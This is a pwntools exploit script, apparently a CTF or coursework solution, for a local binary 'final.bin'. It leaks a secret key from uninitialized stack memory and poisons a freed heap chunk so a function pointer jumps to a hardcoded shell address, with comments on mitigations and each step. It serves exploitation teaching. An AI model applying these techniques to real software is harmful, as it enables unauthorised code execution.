from pwn import *

# To tidy up output, ignore the BytesWarnings produced by pwntools
import warnings
warnings.filterwarnings("ignore", category=BytesWarning)
# Additionally, the binary has a lot of output with its main menu function,
# so I have tucked ps.clean(timeout=0.02) around to tighten things up!

ps = process("./final.bin")
#ps = gdb.debug("./final.bin")


# This problem requires 2 different uninitialized variables to be exploited.
# STACK VARIABLE: We are going to leak the system key out of memory because it 
#                 it is uninitialized in the same space as our username during logon
# HEAP VARIABLE: We are going to redirect the function pointer in the executor struct
#                after gaining access to the ADVANCED OPTIONS menu, using the leaked key
# 
# CHECKSEC
#
# Canaries are enabled, but we aren't overwriting buffers to win. Imagine the spy movies 
#                       with the laser guarded hallway. Gingerly walk and flip around them
# NX is enabled, if you find a shellcode solution, kudos
# NO PIE!! <- can predictably overwrite the debug shell location, no leak and calc required
# Other things are enabled but unimportant

#  STEP 1: Acquire the secret key
log.info("Leaking secret key from uninitialized stack space")
ps.sendline("2") # View the username before setting it
ps.recvuntil("> - ") # Read up until key
KEY = ps.recvuntil("\n", drop=True) # Drop new line end character

log.info(f"KEY RECV'ED: {KEY}")

# STEP 2: Login, and get and set stage for controlling heap
log.info("Logging in to system with anything other than system")
ps.clean(timeout=0.02)
ps.sendline("1") # Set username
ps.sendline("username")
ps.clean(timeout=0.02)
ps.sendline("3") # Continue
ps.sendline("password")
log.info("USER: username\nPASS: password")

# STEP 3: CREATE CUSTOM MEMO
log.info("Customizing memo to corrupt heap cache")
ps.clean(timeout=0.02)
ps.sendline("2") # Make new memo
PADDING = b"A" * 16
SHELL = p64(0x000000000040131f) # Location of "Physical Operator test shell"
payload = PADDING + SHELL
ps.sendline(payload)

# STEP 4: FREE CUSTOM MEMO TO POISON HEAP
log.info("Poisoned chunk is freed!")
ps.clean(timeout=0.02)
ps.sendline("4") # Erase memo option (Free memo object with same size as executor

# STEP 5: ACCESS ADVANCED CONTROL PANEL
log.info("System level auth bypassed using secret key")
ps.clean(timeout=0.02)
ps.sendline("5") # Select advanced options page
ps.sendline(KEY) # Requires system level access. Enter leaked key

# STEP 6: POP A SHELL
# In theory, upon landing on the advanced operations page, the executor object now holds poisoned
# heap chunk and is uninitialized to actually change system configurations. Run configurations
log.info("Poisoned chunk now owned by system executor")
ps.clean(timeout=0.02)
ps.sendline("2")
log.info("Poppin shells :)")

# Profit?!
ps.clean(timeout=0.02)
ps.interactive()



